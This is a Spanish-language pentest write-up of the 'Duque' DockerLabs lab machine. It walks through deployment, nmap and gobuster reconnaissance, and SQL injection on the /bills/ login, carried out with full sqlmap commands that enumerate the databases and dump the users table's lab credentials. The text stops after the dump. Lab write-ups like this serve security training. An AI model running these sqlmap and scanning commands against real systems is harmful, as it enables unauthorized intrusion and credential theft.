# 🧠 **Informe de Pentesting – Máquina: Duque**

### 💡 **Dificultad:** Fácil

📦 **Plataforma:** DockerLabs

🌐 **Objetivo:** (Complétalo)

![Despliegue](/Duque/Imagenes/Duque.png)

---

## 🚀 **Despliegue de la Máquina**

Se inicia la máquina vulnerable descomprimiendo el archivo proporcionado y ejecutando el script de despliegue:

```bash
unzip bicho.zip
sudo bash auto_deploy.sh duque.tar
```

---

## 📶 **Comprobación de Conectividad**

Se valida que la máquina objetivo se encuentra activa y responde a solicitudes ICMP:

```bash
ping -c1 172.17.0.2
```

---

## 🔍 **Escaneo de Puertos**

### 🔎 Escaneo Total

Se realiza un escaneo completo de todos los puertos TCP con el objetivo de identificar servicios expuestos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 
```

**Puertos abiertos identificados:**

* `22/tcp`: SSH
* `80/tcp`: HTTP

### 🧩 Detección de Servicios

Se procede a enumerar versiones y servicios activos en los puertos detectados:

```bash
nmap -sCV -p22,80 172.17.0.2 
```

![Puertos](/Duque/Imagenes/conectividad.png)

---

## 🧭 **Reconocimiento Web**

### 🖥️ Acceso inicial

Al acceder a `http://172.17.0.2`, se observa una aplicación web funcional.

### 🗂️ Fuzzing de Directorios

Se realiza un descubrimiento de rutas mediante fuerza bruta utilizando Gobuster:

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

Como resultado, se identificaron múltiples rutas asociadas a la aplicación. Se procedió a analizar cada una de ellas en busca de funcionalidades relevantes o vectores de ataque.

![logs](/Duque/Imagenes/gobusteruno.png)

Durante este proceso, se identificó un directorio de inicio de sesión denominado **`/bills/`**. Posteriormente, se analizó la funcionalidad de autenticación utilizando Burp Suite, detectando indicios de una posible **inyección SQL**.

Con base en este hallazgo, se decidió utilizar la herramienta **sqlmap** para validar y explotar la vulnerabilidad.

---

## 🧪 **Explotación de Inyección SQL**

### 1. Resumen de la Actividad

Se llevó a cabo una prueba de penetración automatizada contra la aplicación web alojada en `172.17.0.2`. El objetivo fue identificar vulnerabilidades de tipo **SQL Injection (SQLi)** y determinar si era posible extraer información del sistema gestor de bases de datos.

---

### 2. Comando Ejecutado

Se utilizó la herramienta **sqlmap** con la siguiente sintaxis:

```bash
sqlmap -u "http://172.17.0.2/bills/" --data="username=admin&password=admin" --cookie="PHPSESSID=kb6o4ar4t76gcg2dnl2br89b8o" --level=5 --risk=3 --batch --dbs
```

---

### 3. Explicación de los Parámetros

A continuación, se describe la función de cada parámetro utilizado:

* **`-u`**: Define la URL objetivo a analizar.
* **`--data`**: Indica que la solicitud utiliza el método POST, incluyendo los parámetros `username` y `password`.
* **`--cookie`**: Proporciona una sesión válida para acceder a recursos autenticados.
* **`--level=5`**: Nivel máximo de profundidad en las pruebas de inyección.
* **`--risk=3`**: Nivel máximo de riesgo, incluyendo pruebas más agresivas.
* **`--batch`**: Automatiza la ejecución sin interacción manual.
* **`--dbs`**: Enumera las bases de datos disponibles.

![sqlverificar](/Duque/Imagenes/coamndoverifisqluno.png)

---

### 4. Resultados Obtenidos

Tras la ejecución del comando, se confirmó la existencia de una vulnerabilidad de **inyección SQL**. Se logró identificar el DBMS como **MySQL/MariaDB**.

Se enumeraron las siguientes bases de datos:

1. `information_schema`
2. `mysql`
3. `performance_schema`
4. **`register`** (base de datos principal de la aplicación)
5. `sys`

![sqlverificar](/Duque/Imagenes/confirsql.png)

Se concluye que la vulnerabilidad es **crítica**, ya que permite el acceso completo a la estructura del sistema de bases de datos.

---

## 🔎 **Enumeración de Tablas**

### 1. Resumen de la Actividad

Una vez identificada la base de datos objetivo (`register`), se procede a enumerar las tablas contenidas en ella con el fin de localizar información sensible.

---

### 2. Comando Ejecutado

```bash
sqlmap -u "http://172.17.0.2/bills/" --data="username=admin&password=admin" --cookie="PHPSESSID=kb6o4ar4t76gcg2dnl2br89b8o" -D register --tables --batch
```

![sqlverificar](/Duque/Imagenes/coamndosegundosql.png)

---

### 3. Explicación de los Parámetros

* **`-D register`**: Especifica la base de datos objetivo.
* **`--tables`**: Enumera las tablas existentes dentro de la base de datos seleccionada.
* **`--batch`**: Mantiene la ejecución automatizada.

---

### 4. Resultados y Hallazgos

Se obtuvo la siguiente información:

* **Base de datos:** `register`
* **Número de tablas:** 1
* **Tabla identificada:** `users`

![sqlverificar](/Duque/Imagenes/userresuldossql.png)

---

### 5. Conclusión Técnica

La identificación de la tabla `users` representa un hallazgo de alto impacto, ya que típicamente contiene credenciales de acceso y datos sensibles de usuarios.

Este resultado confirma que un atacante puede navegar libremente por la estructura interna de la base de datos.

---

## 📤 **Exfiltración de Datos**

### 1. Resumen de la Actividad

Se procede a la extracción de los datos contenidos en la tabla `users` con el objetivo de evidenciar el impacto real de la vulnerabilidad.

---

### 2. Comando Ejecutado

```bash
sqlmap -u "http://172.17.0.2/bills/" --data="username=admin&password=admin" --cookie="PHPSESSID=kb6o4ar4t76gcg2dnl2br89b8o" -D register -T users --dump --batch
```

![sqlverificar](/Duque/Imagenes/comandotressql.png)

---

### 3. Explicación de los Parámetros

* **`-D register`**: Base de datos objetivo.
* **`-T users`**: Tabla específica a extraer.
* **`--dump`**: Extrae todos los registros disponibles.
* **`--batch`**: Ejecución automatizada.

---

### 4. Análisis de Resultados

Se identificó la siguiente estructura:

* Columnas: `id`, `passwd`, `username`

Se recuperaron los siguientes registros:

1. Usuario: `mario` | Contraseña: `mario123`
2. Usuario: `jesus` | Contraseña: `jesus2026`
3. Usuario: `admin` | Contraseña: `admin123`

Además, la herramienta generó automáticamente un archivo en formato CSV para su análisis posterior.

![sqlverificar](/Duque/Imagenes/usuariosresultre.png)

---




